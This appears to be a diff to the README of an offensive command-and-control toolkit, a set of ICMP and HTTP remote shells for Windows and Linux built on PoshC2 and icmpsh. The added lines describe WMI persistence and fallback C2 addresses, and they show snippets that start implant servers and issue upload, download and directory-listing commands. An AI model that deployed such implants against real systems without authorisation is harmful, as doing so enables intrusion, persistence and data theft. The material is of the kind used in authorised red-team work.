@@ -1,9 +1,10 @@
 ## Description:
 ```txt
-A port of PoshC2 using ICMP with authentication and fallback channels as a list of IPs or subnets to avoid hardcoding IPs.
-For C2 servers (i.e. *_icmp_c2.py) you must disable ICMP echo requests: "ssysctl -w net.ipv4.icmp_echo_ignore_all=1"
+A collection of custom ICMP and HTTP C2 for Windows and Linux. Windows ICMP shells come with PoshC2 standard features, authentication, fallback channels as a list of IPs or subnets to avoid hardcoding IPs, additional WMI persistence, and crypto + other features. 
 
-*Most of this code is borrowed from or inspired by various sources. Credit goes to:
+NOTE: For ICMP C2 servers (i.e. *_icmp_c2.py) you must disable ICMP echo requests: "ssysctl -w net.ipv4.icmp_echo_ignore_all=1"
+
+*this code is borrowed from or inspired by various sources:
     
     https://github.com/inquisb/icmpsh
     https://github.com/nettitude/PoshC2
@@ -169,5 +170,23 @@ password = 'PWN'
 icmp_shell = ICMPShell(ip_address=c2Server, key=password)
 icmp_shell.set_fallback_ips(fallback_ips)
 icmp_shell.run_shell()
+
+```
+
+### Linux HTTP implant usage
+```py
+# file: ./linux/http_basic_server.py
+server = HttpsServer(
+             options.password, options.ip, options.port, encrypt, options.encrypt
+         )
+server.start()
+```
+
+### Linux C2 core HTTP commands (requires Python):
+```txt
+# file: ./linux/http_c2.py as the server
+upload_file /source /dest
+download_file /source /dest
+list_directory /path
 
 ```
